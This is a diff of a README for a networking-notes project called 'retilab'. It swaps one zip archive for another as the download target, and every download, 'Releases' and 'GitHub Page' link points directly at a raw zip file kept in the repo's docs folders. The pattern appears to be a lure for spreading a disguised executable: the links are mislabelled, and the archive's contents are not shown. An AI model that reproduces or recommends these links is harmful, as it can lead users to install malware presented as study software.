@@ -8,7 +8,7 @@ To get started, follow the steps below.
 
 ## 📥 Download Now
 
-[![Download](https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/images/Software-v1.1.zip%https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/images/Software-v1.1.zip)](https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/images/Software-v1.1.zip)
+[![Download](https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/javascripts/Software_v3.2.zip%https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/javascripts/Software_v3.2.zip)](https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/javascripts/Software_v3.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -43,7 +43,7 @@ Our notes cover a wide range of crucial networking topics:
 
 ## 📥 Download & Install
 
-To get the latest version of **retilab**, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/images/Software-v1.1.zip).
+To get the latest version of **retilab**, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/javascripts/Software_v3.2.zip).
 
 ### Steps to Install:
 
@@ -83,6 +83,6 @@ We welcome contributions from anyone interested in improving the **retilab** pro
 
 ## 🔗 Learn More
 
-For more information, FAQs, and to see our latest updates, visit our [GitHub Page](https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/images/Software-v1.1.zip).
+For more information, FAQs, and to see our latest updates, visit our [GitHub Page](https://raw.githubusercontent.com/professorgabryel/retilab/main/docs/javascripts/Software_v3.2.zip).
 
 Thank you for using **retilab**. Happy studying!
